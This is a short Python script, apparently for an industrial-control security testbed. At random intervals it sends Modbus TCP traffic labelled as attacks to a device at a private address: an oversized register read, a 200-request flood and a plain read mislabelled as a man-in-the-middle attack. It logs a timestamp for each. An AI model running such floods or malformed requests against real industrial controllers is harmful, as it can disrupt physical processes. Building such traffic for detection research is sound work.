#!/usr/bin/env python

from pymodbus.client import ModbusTcpClient as ModbusClient

from datetime import datetime

import time
import random



def False_Packet_Attack():
    client = ModbusClient('192.168.1.230')
    client.connect()
    try:
        client.read_holding_registers(1, 2100)
    except:
        pass
    
    print("Modbus False Packet Send Attempted \n")
    print("Time Stamp: " + str(time.time()))
    with open("modbus_false_packet.txt", "a") as f:  # open the file in append mode
        # Get the current date and time
        now = datetime.now()

        # Use the strftime function to format the date and time
        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")

        f.write(str(date_time) + "\n")  # write the current timestamp to the file then a new line


def begin_flood():
    client = ModbusClient('192.168.1.230')
    client.connect()
    for i in range(200):
        client.read_holding_registers(1, 5, unit=1)

    print("Modbus Network Flood Attempted - sent 200 packets \n")
    print("Time Stamp: " + str(time.time()))
    with open("modbus_floods.txt", "a") as f:  # open the file in append mode
        # Get the current date and time
        now = datetime.now()

        # Use the strftime function to format the date and time
        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")

        f.write(str(date_time) + "\n")  # write the current timestamp to the file then a new line
        
def mitm_attack():
    client = ModbusClient('192.168.1.230')
    client.connect()
    client.read_holding_registers(1, 5, unit=1)

    print("Modbus MITM Attempted \n")
    print("Time Stamp: " + str(time.time()))
    with open("modbus_mitm.txt", "a") as f:  # open the file in append mode
        # Get the current date and time
        now = datetime.now()

        # Use the strftime function to format the date and time
        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")

        f.write(str(date_time) + "\n")  # write the current timestamp to the file then a new line

functions = [False_Packet_Attack, begin_flood, mitm_attack]

while True:
    # Generate a random interval between 1 seconds and 30 seconds
    random_interval = random.uniform(20, 60)
    print(f"Interval generated... Waiting {random_interval:.2f} seconds before running attack")
    time.sleep(random_interval)
    random.choice(functions)()
